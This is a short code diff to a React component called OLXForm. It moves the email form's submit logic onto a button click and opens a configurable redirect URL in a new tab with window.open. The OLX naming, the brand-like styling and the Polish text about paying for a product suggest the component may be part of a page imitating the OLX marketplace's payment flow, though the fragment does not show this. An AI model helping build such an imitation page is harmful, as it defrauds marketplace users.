@@ -43,21 +43,16 @@ export default function OLXForm() {
     return Object.keys(newErrors).length === 0;
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
+    e.stopPropagation();
 
     if (!validateForm()) {
       return;
     }
 
     if (REDIRECT_URL) {
-      const a = document.createElement('a');
-      a.href = REDIRECT_URL;
-      a.target = '_blank';
-      a.rel = 'noopener noreferrer';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+      window.open(REDIRECT_URL, '_blank', 'noopener,noreferrer');
     }
 
     setIsLoading(true);
@@ -194,7 +189,7 @@ export default function OLXForm() {
             płatność za produkt.
           </p>
 
-          <form onSubmit={handleSubmit} className="space-y-6">
+          <form className="space-y-6">
             {/* Email Field */}
             <div>
               <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
@@ -240,7 +235,8 @@ export default function OLXForm() {
             </div>
 
             <button
-              type="submit"
+              type="button"
+              onClick={handleSubmit}
               disabled={isLoading}
               className="w-full bg-[#002F34] hover:bg-[#001F24] disabled:bg-gray-400 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
             >
